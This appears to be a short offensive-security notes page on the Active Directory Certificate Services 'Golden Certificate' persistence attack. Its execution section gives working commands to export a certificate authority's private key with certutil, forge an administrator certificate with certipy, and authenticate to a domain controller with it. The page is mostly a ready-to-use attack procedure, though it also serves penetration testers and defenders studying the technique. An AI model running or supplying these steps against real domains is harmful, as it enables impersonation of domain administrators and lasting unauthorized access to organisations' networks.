---
icon: certificate
---

# Golden Certificate

## <mark style="color:yellow;">ABOUT</mark>

If an attacker <mark style="color:purple;">**obtains control over a CA server**</mark>, he may be able to <mark style="color:yellow;">**retrieve the private key**</mark> associated with the CA cert, and use that private key to generate and sign client certificates. This means he could **forge (and sign)** certificate to authenticate as a powerful user for example.

There are A LOT of different ways and ESC's to get to CA. but when we do, we can abuse this attack.

## <mark style="color:yellow;">EXECUTION</mark>

#### Export the CA’s private key

```powershell
certutil -exportPFX my "CA-MILITECH" C:\ca.pfx
```

#### Forge a certificate for any domain user

```bash
certipy forge -ca-pfx ca.pfx -upn 'administrator@militech.local' -subject 'CN=Administrator,CN=Users,DC=domain,DC=local' -out forged_admin.pfx
```

#### Authenticate using that certificate

```bash
certipy auth -pfx forged_admin.pfx -username 'administrator' -domain 'domain.local' -dc-ip 13.13.13.13
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://www.thehacker.recipes/ad/persistence/adcs/certificate-authority#stolen-ca" %}
